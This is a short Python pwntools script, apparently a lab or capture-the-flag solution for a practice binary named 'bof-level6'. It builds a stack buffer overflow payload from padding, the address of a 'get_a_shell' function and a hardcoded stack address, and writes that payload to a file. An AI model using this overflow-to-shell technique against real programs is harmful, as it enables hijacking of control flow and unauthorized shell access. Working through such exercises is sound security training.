#!/usr/bin/env python
from pwn import	*

# stack offset to overwrite rip
stack_offset = 128
stack = p64(0x7fffffffe350)
p = process("./bof-level6")

de = "AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAA"

# print output
print(p.recv(0x200))

# load the program as an ELF object
e = ELF("./bof-level6")

# get the address of get_a_shell
shell_address = e.symbols['get_a_shell']

# the address is in integer, so it prints a decimal value
print(shell_address)

# you can print hexadecimal value with hex()
print(hex(shell_address))

buffer = "A"*8 + p64(shell_address) + de[:112] + stack

with open('pattern.txt', 'w') as f:
    f.write(buffer)

exit()

# sendline - attaching newline automatically at the end of the input!
p.sendline(buffer)

p.interactive()
